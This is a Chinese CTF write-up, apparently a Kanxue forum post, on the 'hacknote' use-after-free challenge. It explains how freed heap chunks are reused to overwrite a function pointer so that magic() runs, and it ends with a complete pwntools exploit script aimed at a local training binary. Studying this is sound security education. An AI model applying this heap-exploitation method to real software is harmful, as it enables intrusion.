
# [原创]Use-after-free之lab 10 hacknote

整明白之后才能明白这道题有多简单，花了我两天时间啊！！！

自己的基础知识积累真的不够 ![](https://bbs.kanxue.com/upload/attach/202106/911910_FHJCD96UAJXJGF3.png)

看看主函数啊

输入 1 进入 `add_note()`

输入 2 进入 `del_note()`

输入 3 进入 `print_note()`

简单分析一下

`add_note()` ![](https://bbs.kanxue.com/upload/attach/202106/911910_PCAK5GDD4U6NEE5.png)

首先看看这个`notelist[]`

我当时也是懵了好久不知道是这是个啥

为啥里面还有`put`,`content`

这其实是个结构体指针数组，也就是说这个数组里面放的是结构体的指针，双击一下`put`或者`content`就知道了 ![](https://bbs.kanxue.com/upload/attach/202106/911910_7TERFPWQE4DYY56.png)

这个函数的大致意思就是先申请一个大小为8byte的`chunk0`，将其地址放入`notelist[i]`中

再申请自己规定字节大小的`chunk1`,将其地址放入第一次申请的`chunk0`的`content`中

第一次申请的8byte的`chunk0`的`put`处存放`print_note_content`函数地址

`content`处存放第二次申请的`chunk1`的地址

我们后面写内容是往第二次申请的`chunk1`中填写的

假设我们申请了一个32byte的`chunk1`，往里面填写'aaaa'，最终会达到这样一个效果

![](https://bbs.kanxue.com/upload/attach/202106/911910_6D76ZUB35QC62TE.png)

接下来我们看`del_note()` ![](https://bbs.kanxue.com/upload/attach/202106/911910_4CER9W5TH6C6URC.png)

`free`掉了`chunk0`和`chunk1`

但是我们注意这里没有将`notelist[i]`里面的存放的指针设置为`NULL`

这也就导致虽然我们`free`掉了这两块`chunk`，但我们仍然可以对其原来所在的地址空间进行操作。

因此就会造成`use_after_free`

究竟怎样利用，我们先往后看

`print_note()` ![](https://bbs.kanxue.com/upload/attach/202106/911910_49JUGTBY6WNJNHM.png)

打印函数，通过`chunk0`处存放的函数指针（`print_note_content`）打印`content`

其次，这里面还有一个函数值得关注`magic()`

![](https://bbs.kanxue.com/upload/attach/202106/911910_2E68EZ6PDN9NSNF.png)

话不多说，我们开始写jio本

![](https://bbs.kanxue.com/upload/attach/202106/911910_2HXV4ZGC5E3CR6D.png)

我们先申请两个相同字节的`chunk`

`note0`和`note1`

然后全都`free`掉

`chunk`，注意不能是8byte，原因后面会说

例如我们申请32byte的 ![](https://bbs.kanxue.com/upload/attach/202106/911910_JP6H5UAW3MDFHM7.png)

`free`掉之后我们看看`fastbin`

因为我的`pwndbg`出现了一点问题（`fastbin`查不到），所以我在这给大家手画一个

大概是这个样子

![](https://bbs.kanxue.com/upload/attach/202106/911910_3S7S2SRW3KXA5ZV.png)

如果这个时候我们再申请一个8字节大小的`chunk`会怎么样呢

答案是首先原本的`note1`的`chunk0`会被当成新的`chunk0`，而原本的`note0`的`chunk0`会被当成新的`chunk1`

这时如果我们向新的`chunk1`中填写数据，则相当于将`note0`的`chunk0`更改了

例如我们这样

![](https://bbs.kanxue.com/upload/attach/202106/911910_SAKJZ56N3QVKN5V.png)

则`note0`的`chunk0`会变成这样 ![](https://bbs.kanxue.com/upload/attach/202106/911910_C6NXEQWG3S5QZSW.png)

此时我们再执行`print_note()`就会执行`magic`函数

如果我们之前申请的`note0`和`note1`的`chunk1`大小是8byte那么`fastbin`就不会像上面那样排列了，所以不能是8byte

![](https://bbs.kanxue.com/upload/attach/202106/911910_74UCB5VZ3R4VPNP.png) ![](https://bbs.kanxue.com/upload/attach/202106/911910_MM2S6TZ2ETHBMGT.png)

完整的exp:

```python
from pwn import *
sh=process('./hacknote')
elf=ELF('./hacknote')
def malloc(size,content):
    sh.recvuntil('choice :')
    sh.sendline('1')
    sh.recvuntil('size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(content)
def free(idx):
    sh.recvuntil('choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))
def printf(idx):
    sh.recvuntil('choice :')
    sh.sendline('3')
    sh.recvuntil("Index :")
    sh.sendline(str(idx))
malloc(32,'aaaa') #note0
malloc(32,'aaaa') #note1
free(0)
free(1)
magic_addr=0x08048986
malloc(0x8,p32(magic_addr))
printf(0)
sh.interactive()
```

如有不正确的地方，还请师傅们提出来

大家有什么问题也可以问我呀

懂我意思嘛，我向你敬礼啊！~

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2021-6-12 11:16 被凡人\_编辑

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
